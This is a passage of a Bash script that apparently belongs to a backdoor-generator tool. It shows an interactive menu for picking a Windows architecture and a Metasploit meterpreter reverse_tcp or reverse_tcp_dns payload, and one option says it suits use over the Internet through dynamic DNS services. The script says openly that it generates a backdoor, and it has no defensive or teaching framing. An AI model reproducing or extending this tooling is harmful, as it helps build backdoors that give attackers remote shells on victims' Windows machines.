WINx86_Rev_Tcp=windows/meterpreter/reverse_tcp
WINx64_Rev_Tcp=windows/x64/meterpreter/reverse_tcp
WINx86_Rev_Tcpdns=windows/meterpreter/reverse_tcp_dns
ARCHVALID=false
until [ "$ARCHVALID" == true ]
do
    clear
    echo "[ Windows Architecture ]"
    echo "[i] 1 - x86"
    echo "[i] 2 - x64" 
    echo ""
    Input "Select Windows Arch: " 
    WINARCH=$UserInput
    
    case $WINARCH in 
                1)
                    ARCHVALID=true
                    WINARCH=x86
                    PAYLOADVALID=false
                    until [ "$PAYLOADVALID" == true ]
                    do
                        clear
                        echo "[ Payloads ]"
                        echo "[i] 1 - Meterpreter Reverse TCP"
                        echo "[i] 2 - Meterpreter Reverse TCP DNS (For Internet use, NoIP, Dyndns ..)"
                        echo ""
                        Input "[i] Select Payload: " 
                        PAYLOAD=$UserInput
                            case $PAYLOAD in
                                        1)
                                            PAYLOAD=$WINx86_Rev_Tcp
                                            PAYLOADVALID=true
                                        ;;
                                        2)
                                            PAYLOAD=$WINx86_Rev_Tcpdns
                                            PAYLOADVALID=true
                                        ;;
                                        *)
                                            PAYLOADVALID=false
                            esac
                    done
                ;;
                
                2)
                    ARCHVALID=true
                    WINARCH=x64
                    PAYLOADVALID=false
                    until [ "$PAYLOADVALID" == true ]
                    do
                        clear
                        echo "[ Payloads ]"
                        echo "[i] 1 - Meterpreter Reverse TCP"
                        echo "[i] 2 - Meterpreter Reverse TCP DNS ( Backdoor Will Gen in x86 )"
                        echo ""
                        Input "[i] Select Payload: " 
                        PAYLOAD=$UserInput
                            case $PAYLOAD in
                                        1)
                                            PAYLOAD=$WINx64_Rev_Tcp
                                            PAYLOADVALID=true
                                        ;;
                                        2)
                                            PAYLOAD=$WINx86_Rev_Tcpdns
                                            PAYLOADVALID=true
                                        ;;
                                        *)
                                            PAYLOADVALID=false
                            esac
                    done
                ;;
                *)
                    ARCHVALID=false
    esac
done
ARCH=$WINARCH
